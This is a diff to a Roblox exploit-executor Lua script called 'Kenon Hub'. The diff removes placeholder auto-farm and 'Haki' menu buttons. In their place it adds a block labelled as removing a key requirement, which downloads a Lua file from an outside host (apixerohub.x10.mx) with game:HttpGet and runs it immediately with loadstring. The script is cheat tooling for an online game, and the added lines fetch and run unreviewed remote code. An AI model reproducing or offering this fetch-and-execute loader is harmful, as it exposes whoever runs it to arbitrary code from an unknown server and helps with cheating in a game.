@@ -1,8 +1,7 @@
--- Universal Kenon Hub Script for all Executors (Auto-Open Menu)
--- Owner: khoitongdz
+-- Kenon Hub - No Key Version
 
--- Display Script Information
-print([[
+-- Display Kenon Hub title and owner
+print([[ 
 ██╗  ██╗███████╗ █████╗ ███╗   ██╗
 ██║  ██║██╔════╝██╔══██╗████╗  ██║
 ███████║█████╗  ███████║██╔██╗ ██║
@@ -10,7 +9,7 @@ print([[
 ██║  ██║███████╗██║  ██║██║ ╚████║
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
 
-🔥 Universal Kenon Hub Script Loaded 🔥
+🔥 Kenon Hub Loaded 🔥
 Owner: khoitongdz
 ]])
 
@@ -81,101 +80,18 @@ settingsTab.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
 settingsTab.TextColor3 = Color3.fromRGB(255, 255, 255)
 settingsTab.Parent = tabFrame
 
--- Farm Tab Content
-local farmFrame = Instance.new("Frame")
-farmFrame.Size = UDim2.new(0, 400, 0, 200)
-farmFrame.Position = UDim2.new(0, 0, 0, 90)
-farmFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-farmFrame.Parent = mainFrame
-farmFrame.Visible = false
-
-local autoFarmButton = Instance.new("TextButton")
-autoFarmButton.Size = UDim2.new(0, 150, 0, 40)
-autoFarmButton.Position = UDim2.new(0, 25, 0, 20)
-autoFarmButton.Text = "Start Auto Farm"
-autoFarmButton.TextSize = 18
-autoFarmButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0)
-autoFarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-autoFarmButton.Parent = farmFrame
-
-local stopFarmButton = Instance.new("TextButton")
-stopFarmButton.Size = UDim2.new(0, 150, 0, 40)
-stopFarmButton.Position = UDim2.new(0, 25, 0, 80)
-stopFarmButton.Text = "Stop Auto Farm"
-stopFarmButton.TextSize = 18
-stopFarmButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-stopFarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-stopFarmButton.Parent = farmFrame
-
--- Settings Tab Content
-local settingsFrame = Instance.new("Frame")
-settingsFrame.Size = UDim2.new(0, 400, 0, 200)
-settingsFrame.Position = UDim2.new(0, 0, 0, 90)
-settingsFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-settingsFrame.Parent = mainFrame
-settingsFrame.Visible = false
-
-local enableHakiButton = Instance.new("TextButton")
-enableHakiButton.Size = UDim2.new(0, 150, 0, 40)
-enableHakiButton.Position = UDim2.new(0, 25, 0, 20)
-enableHakiButton.Text = "Enable Haki"
-enableHakiButton.TextSize = 18
-enableHakiButton.BackgroundColor3 = Color3.fromRGB(0, 128, 255)
-enableHakiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-enableHakiButton.Parent = settingsFrame
-
-local disableHakiButton = Instance.new("TextButton")
-disableHakiButton.Size = UDim2.new(0, 150, 0, 40)
-disableHakiButton.Position = UDim2.new(0, 25, 0, 80)
-disableHakiButton.Text = "Disable Haki"
-disableHakiButton.TextSize = 18
-disableHakiButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-disableHakiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-disableHakiButton.Parent = settingsFrame
-
--- Button Toggles for Tabs
-farmTab.MouseButton1Click:Connect(function()
-    farmFrame.Visible = true
-    settingsFrame.Visible = false
+-- Remove Key Requirement (Just load the content)
+local success, result = pcall(function()
+    return game:HttpGet("http://apixerohub.x10.mx/new_main.lua")
 end)
 
-settingsTab.MouseButton1Click:Connect(function()
-    settingsFrame.Visible = true
-    farmFrame.Visible = false
-end)
-
--- Auto Farm Logic (Simple Loop)
-local isAutoFarming = false
-
-local function startAutoFarm()
-    while isAutoFarming do
-        -- Logic to automatically farm goes here
-        print("Farming monsters...")
-        wait(1) -- Delay to simulate farming
-    end
+if success then
+    -- If the request was successful, execute the loaded code
+    loadstring(result)()
+else
+    -- Handle any errors that occur during the HTTP request or script execution
+    warn("Failed to load script: " .. result)
 end
-
--- Button Click Handlers
-autoFarmButton.MouseButton1Click:Connect(function()
-    isAutoFarming = true
-    print("Auto Farm Started!")
-    startAutoFarm()
-end)
-
-stopFarmButton.MouseButton1Click:Connect(function()
-    isAutoFarming = false
-    print("Auto Farm Stopped!")
-end)
-
-enableHakiButton.MouseButton1Click:Connect(function()
-    -- Enable Haki logic goes here
-    print("Haki Enabled!")
-end)
-
-disableHakiButton.MouseButton1Click:Connect(function()
-    -- Disable Haki logic goes here
-    print("Haki Disabled!")
-end)
 
 -- Toggle Menu Visibility
 toggleButton.MouseButton1Click:Connect(function()
@@ -188,4 +104,4 @@ toggleButton.MouseButton1Click:Connect(function()
 end)
 
 -- Final Debug Message
-print("Universal Kenon Hub Menu is now visible!")
+print("Kenon Hub is now active!")
